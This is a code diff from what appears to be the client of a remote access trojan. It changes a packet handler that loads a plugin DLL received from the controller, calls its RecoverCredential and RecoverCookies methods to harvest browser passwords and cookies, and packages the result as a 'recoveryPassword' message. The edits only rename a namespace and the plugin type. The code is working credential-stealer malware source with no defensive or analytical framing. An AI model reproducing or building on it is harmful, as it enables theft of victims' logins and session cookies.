@@ -1,5 +1,5 @@
 ﻿using Client.MessagePack;
-using Client.Sockets;
+using Client.Connection;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -16,8 +16,8 @@ namespace Client.Handle_Packet
             {
                 // DLL StealerLib => gitlab.com/thoxy/stealerlib
                 Assembly loader = Assembly.Load(unpack_msgpack.ForcePathObject("Plugin").GetAsBytes());
-                MethodInfo meth = loader.GetType("StealerLib.Browsers.CaptureBrowsers").GetMethod("RecoverCredential");
-                MethodInfo meth2 = loader.GetType("StealerLib.Browsers.CaptureBrowsers").GetMethod("RecoverCookies");
+                MethodInfo meth = loader.GetType("Plugin.Plugin").GetMethod("RecoverCredential");
+                MethodInfo meth2 = loader.GetType("Plugin.Plugin").GetMethod("RecoverCookies");
                 object injObj = loader.CreateInstance(meth.Name);
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
